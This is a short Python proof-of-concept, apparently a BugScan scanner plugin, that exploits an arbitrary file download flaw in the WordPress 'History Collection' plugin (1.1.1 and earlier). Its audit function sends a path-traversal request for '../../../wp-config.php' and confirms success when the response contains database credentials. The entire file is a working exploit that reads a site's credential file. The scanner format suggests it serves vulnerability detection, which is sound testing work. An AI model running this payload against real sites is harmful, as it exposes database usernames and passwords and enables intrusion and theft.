#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Wordpress History Collection <=1.1.1 Arbitraty File Download
Author    : a
mail      : a@lcx.cc
Referer   : https://www.bugscan.net/#!/x/22013
"""

import urlparse
def assign(service, arg):
    if service == 'wordpress':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = 'wp-content/plugins/history-collection/download.php?var=../../../wp-config.php'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and 'define' in res  and 'DB_USER' in res:
        security_hole(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])
